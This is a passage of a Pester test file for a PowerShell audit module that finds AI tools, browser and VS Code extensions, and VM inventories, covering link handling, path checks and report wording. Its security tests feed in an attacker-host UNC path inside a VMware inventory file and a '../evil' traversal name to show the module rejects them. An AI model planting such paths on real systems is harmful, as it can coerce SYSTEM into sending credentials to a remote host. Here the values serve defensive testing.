            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Store 'Mozilla.Firefox') 'wordtune-extension')
            $tool[0].LeftoverOnly | Should -BeFalse -Because 'the Store package Mozilla.Firefox is installed for the user'
            @($tool[0].Signals) | Should -Be @('Mozilla Firefox add-on: support@wordtune.com (profile: default-release)')
            # Store package names in browser-profiles.json are checked.
            Set-TestBrowserConfig -Browsers '{ "windows": [ { "name": "X", "engine": "firefox", "root": "A", "installed": [ { "appx": "Mozilla.Firefox" }, { "appx": "../evil" }, { "appx": "a b" } ] } ] }'
            InModuleScope CEAudit {
                $b = @((Get-CEBrowserProfileRoot).Browsers)
                @($b[0].Installed | ForEach-Object { "$($_.Base):$($_.Path)" }) | Should -Be @('appx:Mozilla.Firefox')
                Test-CEBrowserInstalled -Browser $b[0] -ProfilePath 'C:\nobody' -StorePackages @('Other.App') | Should -BeFalse
                Test-CEBrowserInstalled -Browser $b[0] -ProfilePath 'C:\nobody' -StorePackages @('Other.App', 'Mozilla.Firefox') | Should -BeTrue
            }
        }

        It 'reads installed programs from the 64-bit and 32-bit registry views whatever the PowerShell' {
            # A 32-bit PowerShell sees HKLM:\SOFTWARE as WOW6432Node, so reading it by path misses 64-bit programs.
            InModuleScope CEAudit {
                (Get-Command Get-CEUninstallRegistryEntry -CommandType Function).ScriptBlock.ToString() | Should -Match 'OpenBaseKey' -Because 'the view is opened explicitly, not through the redirected HKLM: drive'
                Mock Get-CEUninstallRegistryEntry {
                    if ($View -eq 'Registry64') { , @([pscustomobject]@{ PSChildName = 'Opera Neon 1.0'; DisplayName = 'Opera Neon 1.0'; DisplayVersion = '1.0'; Publisher = 'Opera Software' }) }
                    else { , @([pscustomobject]@{ PSChildName = '{X}'; DisplayName = 'Old 32-bit tool'; Publisher = 'X' }, [pscustomobject]@{ PSChildName = 'hidden'; DisplayName = 'Hidden'; SystemComponent = 1 }) }
                }
                Mock Get-CEUserRegistryRoot { $null }
                @(Get-CEInstalledSoftware | ForEach-Object { $_.Name }) | Should -Be @('Old 32-bit tool', 'Opera Neon 1.0')
                Should -Invoke Get-CEUninstallRegistryEntry -Times 1 -Exactly -ParameterFilter { $View -eq 'Registry64' }
                Should -Invoke Get-CEUninstallRegistryEntry -Times 1 -Exactly -ParameterFilter { $View -eq 'Registry32' }
            }
        }

        It 'skips an Uninstall subkey it may not read and keeps reading the ones after it' {
            InModuleScope CEAudit {
                (Get-Command Get-CEUninstallRegistryEntry -CommandType Function).ScriptBlock.ToString() | Should -Match 'ConvertFrom-CEUninstallKey'
                # RegistryKey.OpenSubKey throws SecurityException for a key whose ACL denies this account.
                $key = [pscustomobject]@{ Names = @('A', 'Denied', 'Gone', 'BadValue', 'B') }
                $key | Add-Member -MemberType ScriptMethod -Name GetSubKeyNames -Value { $this.Names }
                $key | Add-Member -MemberType ScriptMethod -Name OpenSubKey -Value {
                    param($n)
                    if ($n -eq 'Denied') { throw (New-Object System.Security.SecurityException 'Requested registry access is not allowed.') }
                    if ($n -eq 'Gone') { return $null }
                    $sub = [pscustomobject]@{ N = $n }
                    $sub | Add-Member -MemberType ScriptMethod -Name GetValue -Value {
                        param($v)
                        if ($this.N -eq 'BadValue') { throw (New-Object System.UnauthorizedAccessException 'denied') }
                        if ($v -eq 'DisplayName') { "App $($this.N)" }
                    }
                    $sub | Add-Member -MemberType ScriptMethod -Name Close -Value { }
                    $sub
                }
                $entries = ConvertFrom-CEUninstallKey -Key $key -View 'Registry64'
                @($entries | ForEach-Object { $_.DisplayName }) | Should -Be @('App A', 'App B')
                @($entries | ForEach-Object { $_.PSChildName }) | Should -Be @('A', 'B')
            }
        }

        It 'does not report Comet or Genspark from the profiles they leave behind when uninstalled' {
            $p = Join-Path $TestDrive 'bx-comet'
            New-TestTree $p @("AppData\Local\Perplexity\Comet\User Data\Default\Extensions\$($CETestExtId.Claude)\1.0.94_0",
                'AppData\Local\GensparkSoftware\Genspark-Browser\User Data\Default')
            # The shipped files, read directly so an admin's copy on this machine doesn't change the result,
            # and Program Files is empty (BeforeEach), so a Comet installed on this machine doesn't either.
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $st = Invoke-TestBrowserScan -ProfilePath $p
            @(Get-TestToolById $st 'perplexity-comet').Count | Should -Be 0 -Because 'Comet is not installed'
            @(Get-TestToolById $st 'genspark-browser').Count | Should -Be 0 -Because 'Genspark is not installed'
            $claude = @(Get-TestToolById $st 'claude-in-chrome')
            $claude[0].LeftoverOnly | Should -BeTrue
            @($claude[0].Signals) | Should -Be @("Comet extension: $($CETestExtId.Claude) 1.0.94 (profile: Default; leftover: Comet is not installed)")

            New-TestTree $p @('AppData\Local\Perplexity\Comet\Application\comet.exe')
            $st = Invoke-TestBrowserScan -ProfilePath $p
            @(Get-TestToolById $st 'perplexity-comet')[0].Signals | Should -Contain 'Found %USERPROFILE%\AppData\Local\Perplexity\Comet\Application'
            @(Get-TestToolById $st 'claude-in-chrome')[0].LeftoverOnly | Should -BeFalse
        }

        It 'finds Opera Neon installed for all users while it is closed' {
            # An install in Program Files has no profile folder, and Neon is not running.
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $p = Join-Path $TestDrive 'bx-neon'
            New-Item -ItemType Directory -Force -Path $p | Out-Null
            $neon = [pscustomobject]@{ Name = 'Opera Neon 1.0.4321.0'; Version = '1.0.4321.0'; Publisher = 'Opera Software'; KeyName = 'Opera Neon 1.0.4321.0' }
            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Software @($neon)) 'opera-neon')
            @($tool[0].Signals) | Should -Be @('Installed program: Opera Neon 1.0.4321.0')
            $stable = [pscustomobject]@{ Name = 'Opera Stable 120.0.5543.0'; Version = '120.0.5543.0'; Publisher = 'Opera Software'; KeyName = 'Opera 120.0.5543.0' }
            @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Software @($stable)) 'opera-neon').Count | Should -Be 0 -Because 'plain Opera is not Neon'
        }

        It 'does not reach a skipped link through a folder name ending in a dot' {
            # Windows drops a trailing dot from each part of a path, so 'Profile 1.\Extensions' is read as
            # 'Profile 1\Extensions', through a link called 'Profile 1'.
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $links = New-Object System.Collections.ArrayList
            $dotted = New-Object System.Collections.ArrayList
            try {
                $case = {
                    param([string]$Name, [string]$Parent, [string]$LinkName, [string]$TargetTree)
                    $root = Join-Path $TestDrive "bx-dot-$Name"
                    New-TestTree (Join-Path $root 'profile') @($Parent)
                    New-TestTree (Join-Path $root 'target') @($TargetTree)
                    $l = Join-Path (Join-Path (Join-Path $root 'profile') $Parent) $LinkName
                    New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'target') | Out-Null
                    [void]$links.Add($l)
                    # A plain folder whose name ends in a dot, next to the link; only a \\?\ path can create it.
                    [void][IO.Directory]::CreateDirectory('\\?\' + $l + '.')
                    [void]$dotted.Add($l + '.')
                    return (Join-Path $root 'profile')
                }
                $chrome = & $case 'c' $CETestChromeData 'Profile 1' "Extensions\$($CETestExtId.Claude)\1.0.94_0"
                $firefox = & $case 'f' 'AppData\Roaming\Mozilla\Firefox\Profiles' 'abcd1234.default-release' 'extensions\support@wordtune.com.xpi'
                foreach ($d in $dotted) { [IO.Directory]::Exists('\\?\' + $d) | Should -BeTrue }
                # The links are symbolic links, which an audit above the user's rights does not follow.
                Use-TestSymlinkTag -Paths @($links)
                @(Get-TestBrowserMatch $chrome).Count | Should -Be 0 -Because 'the Chrome profile link is reached only through the name ending in a dot'
                @(Get-TestBrowserMatch $firefox).Count | Should -Be 0 -Because 'the Firefox profile link is reached only through the name ending in a dot'
                # The name ending in a dot is recorded, not dropped silently.
                $st = Invoke-TestBrowserScan -ProfilePath $chrome -Elevated
                @($st.NotRead | Where-Object { $_.Reason -match 'ending in a dot or a space' } | ForEach-Object { $_.Location }) | Should -Be @("%USERPROFILE%\$CETestChromeData")
                InModuleScope CEAudit -Parameters @{ P = $chrome; R = $CETestChromeData } {
                    param($P, $R)
                    $log = New-CENotReadLog
                    $names = Get-CEProfileChildName -ProfilePath $P -Relative $R -Max 10 -Descend -Log $log
                    @($names).Count | Should -Be 0
                    @($log.Records | ForEach-Object { $_.Reason } | Sort-Object) | Should -Be @('a name ending in a dot or a space is not read (Windows would read it as another name)', 'a symbolic link on the way is not followed by an elevated or SYSTEM audit (it could point off this computer)')
                    Test-CERelativePathText 'a\b' | Should -BeTrue
                    foreach ($bad in 'a.\b', 'a \b', 'a\b.', 'a\b ', '.', '..') { Test-CERelativePathText $bad | Should -BeFalse -Because $bad }
                }
            }
            finally {
                foreach ($d in $dotted) { if ([IO.Directory]::Exists('\\?\' + $d)) { [IO.Directory]::Delete('\\?\' + $d) } }
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It 'finds AI tool profile folders and VS Code extensions through checked junctions, and records a symbolic link it does not follow' {
            Use-TestTags   # the junctions' targets are walked from the drive root: TEMP's ancestors count as plain
            Set-TestBrowserConfig -Tools @'
{ "schemaVersion": 2, "tools": [
  { "id": "t-folder", "name": "Folder tool", "canActOnDevice": false, "windows": { "paths": [ "AppData\\Local\\Vendor\\Tool", ".toolrc" ] } },
  { "id": "t-code", "name": "Code tool", "canActOnDevice": false, "windows": { "vscodeExtensions": [ "pub.ext-*" ] } }
] }
'@
            $links = New-Object System.Collections.ArrayList
            try {
                $plain = Join-Path $TestDrive 'lk-plain'
                New-TestTree $plain @('AppData\Local\Vendor\Tool', '.vscode\extensions\pub.ext-1.0.0')
                Set-Content -LiteralPath (Join-Path $plain '.toolrc') -Value '' -Encoding ASCII
                $st = Invoke-TestBrowserScan -ProfilePath $plain
                @(Get-TestToolById $st 't-folder')[0].Signals | Should -Be @('Found %USERPROFILE%\AppData\Local\Vendor\Tool', 'Found %USERPROFILE%\.toolrc')
                @(Get-TestToolById $st 't-code')[0].Signals | Should -Be @('VS Code extension: pub.ext-1.0.0')

                $case = {
                    # A profile whose Link folder is a junction to a target holding TargetTree.
                    param([string]$Name, [string]$Link, [string]$TargetTree)
                    $root = Join-Path $TestDrive "lk-$Name"
                    New-Item -ItemType Directory -Force -Path (Join-Path $root 'profile') | Out-Null
                    if (Split-Path -Parent $Link) { New-Item -ItemType Directory -Force -Path (Join-Path (Join-Path $root 'profile') (Split-Path -Parent $Link)) | Out-Null }
                    New-TestTree (Join-Path $root 'target') @($TargetTree)
                    $l = Join-Path (Join-Path $root 'profile') $Link
                    New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'target') | Out-Null
                    [void]$links.Add($l)
                    return (Join-Path $root 'profile')
                }
                $cases = [ordered]@{
                    'a folder on the way' = & $case 'a' 'AppData\Local\Vendor' 'Tool'
                    'the VS Code folder'  = & $case 'c' '.vscode' 'extensions\pub.ext-1.0.0'
                }
                foreach ($k in $cases.Keys) {
                    # Junctions to local folders: their targets are checked, then names and existence are read through them.
                    @((Invoke-TestBrowserScan -ProfilePath $cases[$k] -Elevated).Tools).Count | Should -Be 1 -Because "$k is a junction to a local folder"
                    @((Invoke-TestBrowserScan -ProfilePath $cases[$k] -System).Tools).Count | Should -Be 1 -Because "$k is a junction to a local folder"
                    @((Invoke-TestBrowserScan -ProfilePath $cases[$k]).Tools).Count | Should -Be 1 -Because "$k is the user's own link, followed in their non-elevated session"
                }
                Use-TestSymlinkTag -Paths @($links)
                $expect = @{ 'a folder on the way' = 'paths|existence|%USERPROFILE%\AppData\Local\Vendor\Tool'; 'the VS Code folder' = 'vscode|folder-listing|%USERPROFILE%\.vscode\extensions' }
                foreach ($k in $cases.Keys) {
                    foreach ($how in 'Elevated', 'System') {
                        $st = if ($how -eq 'System') { Invoke-TestBrowserScan -ProfilePath $cases[$k] -System } else { Invoke-TestBrowserScan -ProfilePath $cases[$k] -Elevated }
                        @($st.Tools).Count | Should -Be 0 -Because "$k is a symbolic link, which an audit above the user's rights ($how) does not follow"
                        @($st.NotRead | ForEach-Object { "$($_.Topic)|$($_.Kind)|$($_.Location)" }) | Should -Be @($expect[$k]) -Because "$k ($how) is recorded, not dropped"
                        # SC-09 has a Manual for it: an agent may be there.
                        Set-TestAITools -NotRead @($st.NotRead)
                        $f = @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object Subject -eq 'Not read')
                        @($f | ForEach-Object Status) | Should -Be @('Manual') -Because "$k ($how)"
                        $f[0].Actual | Should -Match 'an AI agent that can act on this device may not have been seen'
                        $f[0].Recommendation | Should -Match 'full audit without elevation while signed in as that user'
                    }
                    @((Invoke-TestBrowserScan -ProfilePath $cases[$k]).Tools).Count | Should -Be 1 -Because "$k is the user's own link, followed in their non-elevated session"
                }
                # The folder itself may be a link (moved to another drive, say): it is found by its own
                # attributes and not followed, whatever kind of link it is.
                $moved = & $case 'b' 'AppData\Local\Vendor\Tool' 'x'
                Use-TestSymlinkTag -Paths @($links)
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $moved -Elevated) 't-folder')[0].Signals | Should -Be @('Found %USERPROFILE%\AppData\Local\Vendor\Tool')
                InModuleScope CEAudit -Parameters @{ P = $moved } {
                    param($P)
                    Test-CEProfileItem -ProfilePath $P -Relative 'AppData\Local\Vendor\Tool' | Should -BeTrue
                    Test-CEProfileItem -ProfilePath $P -Relative 'AppData\Local\Vendor\Tool\inside' | Should -BeNullOrEmpty -Because 'a folder on the way is a symbolic link'
                    Test-CEProfileItem -ProfilePath $P -Relative 'AppData\Local\Vendor\Other' | Should -BeFalse
                }
            }
            finally {
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It "follows the user's own links in their non-elevated session, and only checked junctions above their rights" {
            Use-TestTags   # the junctions' targets are walked from the drive root: TEMP's ancestors count as plain
            # A developer who moved Chrome's User Data to another drive with a junction still has their
            # extensions found by every audit; had they used a symbolic link, only their own session follows it.
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $root = Join-Path $TestDrive 'bx-own-links'
            New-TestTree (Join-Path $root 'profile') @('AppData\Local\Google\Chrome')
            New-TestTree (Join-Path $root 'other-drive') @("Profile 1\Extensions\$($CETestExtId.Claude)\1.0_0")
            $l = Join-Path $root "profile\$CETestChromeData"
            New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'other-drive') | Out-Null
            try {
                $p = Join-Path $root 'profile'
                $signal = "Google Chrome extension: $($CETestExtId.Claude) 1.0 (profile: Profile 1)"
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-claude')[0].Signals | Should -Be @($signal)
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Elevated) 't-claude')[0].Signals | Should -Be @($signal) -Because 'a junction to a local folder is followed once its target is checked'
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -System) 't-claude')[0].Signals | Should -Be @($signal)
                Use-TestSymlinkTag -Paths @($l)
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-claude')[0].Signals | Should -Be @($signal) -Because "the user's own session follows their symbolic links"
                $st = Invoke-TestBrowserScan -ProfilePath $p -Elevated
                @(Get-TestToolById $st 't-claude').Count | Should -Be 0 -Because 'an elevated audit has more rights than the user'
                @($st.NotRead).Count | Should -Be 1
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -System) 't-claude').Count | Should -Be 0
            }
            finally { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            InModuleScope CEAudit {
                Test-CEAboveUserRights -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false }) | Should -BeFalse
                Test-CEAboveUserRights -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true }) | Should -BeTrue
                Test-CEAboveUserRights -Context ([pscustomobject]@{ IsSystem = $true }) | Should -BeTrue
                Test-CEAboveUserRights -Context $null | Should -BeTrue -Because 'no context is treated as the stricter case'
            }
        }

        It "looks for VS Code's built-in extensions under the profile through checked junctions, not symbolic links" {
            Use-TestTags   # the junctions' targets are walked from the drive root: TEMP's ancestors count as plain
            # Its own It: Invoke-TestBrowserScan mocks Get-CEVsCodeBuiltInExtensionDir for the rest of the one it runs in.
            $links = New-Object System.Collections.ArrayList
            try {
                $vs = Join-Path $TestDrive 'lk-vscode'
                New-TestTree $vs @('AppData\Local\Programs\Microsoft VS Code\abc\resources\app\extensions\copilot')
                New-TestTree (Join-Path $TestDrive 'lk-vscode-target') @('resources\app\extensions\copilot')
                $l = Join-Path $vs 'AppData\Local\Programs\Microsoft VS Code\def'
                New-Item -ItemType Junction -Path $l -Target (Join-Path $TestDrive 'lk-vscode-target') | Out-Null
                [void]$links.Add($l)
                $both = @((Join-Path $vs 'AppData\Local\Programs\Microsoft VS Code\abc\resources\app\extensions'), (Join-Path $vs 'AppData\Local\Programs\Microsoft VS Code\def\resources\app\extensions'))
                $dirs = InModuleScope CEAudit -Parameters @{ P = $vs } { param($P) $d = Get-CEVsCodeBuiltInExtensionDir -ProfilePath $P -Log (New-CENotReadLog) -Above $true; $d }
                @($dirs | Where-Object { $_.StartsWith($vs) } | Sort-Object) | Should -Be $both -Because 'def is a junction to a local folder'
                Use-TestSymlinkTag -Paths @($l)
                $r = InModuleScope CEAudit -Parameters @{ P = $vs } { param($P) $log = New-CENotReadLog; $d = Get-CEVsCodeBuiltInExtensionDir -ProfilePath $P -Log $log -Above $true; [pscustomobject]@{ Dirs = $d; NotRead = @($log.Records) } }
                @($r.Dirs | Where-Object { $_.StartsWith($vs) }) | Should -Be @($both[0])
                @($r.NotRead | ForEach-Object { "$($_.Topic)|$($_.Location)" }) | Should -Be @('vscode-builtin|%USERPROFILE%\AppData\Local\Programs\Microsoft VS Code\def')
                # In the user's own session their link is followed.
                $dirs = InModuleScope CEAudit -Parameters @{ P = $vs } { param($P) $d = Get-CEVsCodeBuiltInExtensionDir -ProfilePath $P -Log (New-CENotReadLog) -Above $false; $d }
                @($dirs | Where-Object { $_.StartsWith($vs) } | Sort-Object) | Should -Be $both
            }
            finally {
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It "reads a built-in VS Code extension's package.json only when it is small and not a link" {
            # The per-user install is in a profile the user controls, and a SYSTEM audit reads it.
            $dir = Join-Path $TestDrive 'lk-vscode-pkg\resources\app\extensions'
            New-TestTree $dir @('copilot', 'big', 'nopkg', 'broken')
            Set-Content -LiteralPath (Join-Path $dir 'copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub" }' -Encoding ASCII
            [IO.File]::WriteAllText((Join-Path $dir 'big\package.json'), ('{ "name": "file", "publisher": "big", "pad": "' + ('x' * (2MB + 16)) + '" }'))
            Set-Content -LiteralPath (Join-Path $dir 'broken\package.json') -Value '{ not json' -Encoding ASCII
            InModuleScope CEAudit -Parameters @{ D = $dir } {
                param($D)
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'copilot') | Should -Be 'github.copilot-chat'
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'big') | Should -Be 'big' -Because 'a package.json over 2 MB is not read'
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'nopkg') | Should -Be 'nopkg'
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'broken') | Should -Be 'broken'
                $budget = [long]10
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'copilot') -Budget ([ref]$budget) | Should -Be 'copilot' -Because 'the byte budget is used up'
                $budget = [long]1000
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'copilot') -Budget ([ref]$budget) | Should -Be 'github.copilot-chat'
                $budget | Should -BeLessThan 1000 -Because 'what was read comes off the budget'
                # The budget counts bytes, not characters: 100 euro signs are 300 bytes in UTF-8.
                $euro = Join-Path $TestDrive 'lk-vscode-euro'
                New-Item -ItemType Directory -Force -Path $euro | Out-Null
                [IO.File]::WriteAllText((Join-Path $euro 'package.json'), ('{ "name": "e", "publisher": "p", "pad": "' + ([string][char]0x20AC * 100) + '" }'), (New-Object Text.UTF8Encoding $false))
                $bytes = (New-Object IO.FileInfo (Join-Path $euro 'package.json')).Length
                $bytes | Should -BeGreaterThan 300
                $budget = [long]1000
                Get-CEVsCodeBuiltInExtensionId -Folder $euro -Budget ([ref]$budget) | Should -Be 'p.e'
                $budget | Should -Be (1000 - $bytes) -Because 'the file length comes off the budget'
                Read-CEBoundedText -Path (Join-Path $D 'big\package.json') -MaxBytes 1MB | Should -BeNullOrEmpty
                Read-CEBoundedText -Path (Join-Path $D 'copilot') -MaxBytes 1MB | Should -BeNullOrEmpty -Because 'a folder is not a file'
                Read-CEBoundedText -Path (Join-Path $D 'copilot\package.json') -MaxBytes 1MB | Should -Match 'copilot-chat'
                # Files a user controls are read through Read-CEBoundedText and folders listed with a cap.
                foreach ($f in 'Get-CEVsCodeBuiltInExtensionId', 'Get-CEAIToolStateUncached', 'Get-CEVMwareMachine', 'Get-CEVirtualBoxMachine', 'Get-CEWslNetworkingMode', 'Read-CENamedFile',
                    'Read-CEProfileFile', 'Get-CEProfileChildName', 'Test-CEProfileItem', 'Get-CEPathChainProblem', 'Get-CEJunctionProblem', 'Get-CEMcpInventory') {
                    (Get-Command $f -CommandType Function).ScriptBlock.ToString() | Should -Not -Match 'Get-Content|Get-ChildItem|ReadAll|Test-Path' -Because $f
                }
            }
            # End to end: Copilot Chat is recognised, and the oversized file falls back to its folder name.
            $st = InModuleScope CEAudit -Parameters @{ D = $dir } {
                param($D)
                $script:pkgDir = $D
                Mock Get-CEVsCodeBuiltInExtensionDir { , @($script:pkgDir) }
                Mock Get-CEUserProfilePath { $null }
                Mock Get-CEInstalledSoftware { @() }
                Mock Get-CEStorePackageName { , @() }
                Mock Get-CEProcessList { , @() }
                Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $true })
            }
            @(Get-TestToolById $st 'github-copilot-vscode')[0].Signals | Should -Be @('VS Code built-in extension: github.copilot-chat')
        }

        It "does not follow a built-in VS Code extension's package.json that is a symbolic link" {
            $dir = Join-Path $TestDrive 'lk-vscode-pkglink'
            New-TestTree $dir @('copilot', 'linked')
            Set-Content -LiteralPath (Join-Path $dir 'copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub" }' -Encoding ASCII
            $link = Join-Path $dir 'linked\package.json'
            try { New-Item -ItemType SymbolicLink -Path $link -Target (Join-Path $dir 'copilot\package.json') -ErrorAction Stop | Out-Null }
            catch { Set-ItResult -Skipped -Because "this account can't create symbolic links: $($_.Exception.Message)"; return }
            try { InModuleScope CEAudit -Parameters @{ D = $dir } { param($D) Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'linked') | Should -Be 'linked' } }
            finally { Remove-Item -LiteralPath $link -Force }
        }

        It 'does not follow a directory symbolic link below the profile' {
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $root = Join-Path $TestDrive 'bx-symlink'
            New-TestTree (Join-Path $root 'profile') @("$CETestChromeData\Profile 1")
            New-TestTree (Join-Path $root 'target') @("Extensions\$($CETestExtId.Claude)\1.0_0")
            $link = Join-Path $root "profile\$CETestChromeData\Profile 2"
            try { New-Item -ItemType SymbolicLink -Path $link -Target (Join-Path $root 'target') -ErrorAction Stop | Out-Null }
            catch { Set-ItResult -Skipped -Because "this account can't create symbolic links: $($_.Exception.Message)"; return }
            try { @(Get-TestBrowserMatch (Join-Path $root 'profile')).Count | Should -Be 0 }
            finally { if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) } }
        }

        It 'stops at the profile and folder limits in browser-profiles.json' {
            $p = Join-Path $TestDrive 'bx-caps'
            New-TestTree $p @(1..3 | ForEach-Object { "$CETestChromeData\Profile $_\Extensions\$($CETestExtId.Claude)\1.0_0" })
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers ($CETestBrowsers -replace '"maxProfilesPerBrowser": 64', '"maxProfilesPerBrowser": 2')
            @(Get-TestBrowserMatch $p).Count | Should -Be 2

            $q = Join-Path $TestDrive 'bx-caps-entries'
            New-TestTree $q @("$CETestChromeData\Default\Extensions\$($CETestExtId.Early)\1.0_0", "$CETestChromeData\Default\Extensions\$($CETestExtId.Claude)\1.0_0")
            Set-TestBrowserConfig -Browsers ($CETestBrowsers -replace '"maxEntriesPerFolder": 2000', '"maxEntriesPerFolder": 1')
            { Get-TestBrowserMatch $q } | Should -Not -Throw
            @(Get-TestBrowserMatch $q).Count | Should -Be 0 -Because 'the first entry used up the listing limit'
        }

        It "looks in the signed-in user's profile when run as SYSTEM, and never on a network path" {
            $p = Join-Path $TestDrive 'bx-system'
            New-TestTree $p @("$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0_0")
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $st = Invoke-TestBrowserScan -ProfilePath $p -System
            @($st.NotRead).Count | Should -Be 0
            @(Get-TestToolById $st 't-claude')[0].Signals | Should -Contain "Google Chrome extension: $($CETestExtId.Claude) 1.0 (profile: Profile 1)"

            $st = Invoke-TestBrowserScan -ProfilePath '' -System
            @($st.NotRead | ForEach-Object { "$($_.Topic)|$($_.Reason)" }) | Should -Be @('profile|no signed-in user profile was found') -Because 'no user signed in at the console was found'
            @($st.Tools).Count | Should -Be 0
            $noProfile = @($st.NotRead)
            # A profile on a network path is recorded, not looked at.
            $st = Invoke-TestBrowserScan -ProfilePath '\\host\share\paul' -System
            @($st.NotRead | ForEach-Object { "$($_.Topic)|$($_.Reason)" }) | Should -Be @('profile|it is not on a local fixed drive')

            # A profile path on another machine is never listed.
            @(Get-TestBrowserMatch '\\host\share\paul').Count | Should -Be 0
            InModuleScope CEAudit {
                $r = Get-CEBrowserExtensionList -ProfilePath '\\host\share\paul' -ChromiumIds @{ 'fcoeoabgfenejglbffodgkkbkcdhcgfn' = $true } -FirefoxIds @{}
                ($null -eq $r) | Should -BeFalse
                @($r).Count | Should -Be 0
            }

            Set-TestAITools -Tools @() -NotRead $noProfile
            $f = @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object Subject -eq 'Not read')
            @($f | ForEach-Object Status) | Should -Be @('Manual') -Because 'with nobody signed in, the profile was not looked at'
            # Only the console user is found as SYSTEM, so someone signed in over Remote Desktop is not 'no one'.
            $f[0].Actual | Should -Be '1 location(s) could not be read, so an AI agent that can act on this device may not have been seen: %USERPROFILE% (not checked): no signed-in user profile was found'
            $f[0].Recommendation | Should -Match 'signed in at the console'
            # The report does not call the device free of AI tools.
            $r = Export-CEReport -Findings $f -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'bx-no-profile')
            (Get-Content $r.Paths.Html -Raw) | Should -Match 'No AI tools confirmed; scan incomplete'
            (Get-Content $r.Paths.Markdown -Raw) | Should -Match 'this list may be incomplete'
        }
    }
}

Describe 'Security review fixes' {
    Context 'VM inventory paths (credential coercion)' {
        It 'accepts only absolute local fixed-drive paths' {
            InModuleScope CEAudit {
                Test-CELocalFilePath 'C:\Users\paul\vm.vmx' | Should -BeTrue
                Test-CELocalFilePath '\\attacker\share\x.vmx' | Should -BeFalse
                Test-CELocalFilePath '//attacker/share/x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\\?\UNC\attacker\share\x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\\.\C:\x.vmx' | Should -BeFalse
                Test-CELocalFilePath 'C:x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\x.vmx' | Should -BeFalse
                Test-CELocalFilePath 'x.vmx' | Should -BeFalse
                Test-CELocalFilePath '' | Should -BeFalse
            }
        }

        It 'never opens a UNC path named in a user VM inventory file' {
            InModuleScope CEAudit {
                $profileDir = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
                New-Item -ItemType Directory -Force -Path (Join-Path $profileDir 'AppData\Roaming\VMware') | Out-Null
                Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Roaming\VMware\inventory.vmls') -Value 'vmlist1.config = "\\attacker-host\share\evil.vmx"'
                # The guard rejects the UNC path, so no VM is returned and the share is never opened
                # (an opened UNC path would coerce SYSTEM to authenticate). The guard itself is unit-tested above.
                # Assign first: the function returns ,@() and @()-wrapping the call inline nests it (see CONTRIBUTING.md).
                $vms = Get-CEVMwareMachine -ProfilePath $profileDir
                @($vms).Count | Should -Be 0
                Test-CELocalFilePath '\\attacker-host\share\evil.vmx' | Should -BeFalse
                # It is recorded, not dropped, in every session, and not as something the user's own session would read.
                foreach ($above in $true, $false) {
                    $log = New-CENotReadLog
                    $vms = Get-CEVMwareMachine -ProfilePath $profileDir -Log $log -Above $above
                    @($vms).Count | Should -Be 0
                    @($log.Records | ForEach-Object { "$($_.Topic)|$($_.Kind)|$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)" }) |
                        Should -Be @('vm-file|file-content|\\attacker-host\share\evil.vmx|it is not on a local fixed drive|False') -Because "above the user's rights: $above"
                }
                $script:testUncVirt = [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() }; VMware = @(); VirtualBox = @(); Wsl = @()
                    WslNetworking = ''; Containers = @(); Listeners = @(); Notes = @(); NotRead = @($log.Records) }
            }
            Set-TestDevice -Kind Secure
            $global:CETestVirt = InModuleScope CEAudit { $script:testUncVirt }
